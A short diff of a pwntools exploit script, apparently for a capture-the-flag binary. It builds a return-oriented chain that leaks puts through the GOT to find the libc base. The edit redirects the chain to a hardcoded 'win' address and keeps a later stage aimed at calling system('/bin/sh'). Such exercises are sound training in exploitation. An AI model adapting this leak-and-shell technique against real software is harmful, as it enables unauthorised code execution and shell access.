@@ -30,7 +30,8 @@ payload = flat (
          elf.got.puts,
          b"A"*8,
          elf.plt.puts,
-         elf.sym.main,
+         p64(0x0040286d) # win__ address
+#         elf.sym.main,
         )
 io.sendlineafter(b"fierce warrior?",payload)
 io.recvline()
@@ -42,7 +43,6 @@ log.success(f"puts@libc: {hex(puts_libc)}")
 libc.address = puts_libc - libc.sym.puts
 
 # 3. Call system("/bin/sh")
-play_game()
 sh = next(libc.search(b"/bin/sh\x00"))
 ret_addr = pop_rdi_addr + 3
 payload = flat (
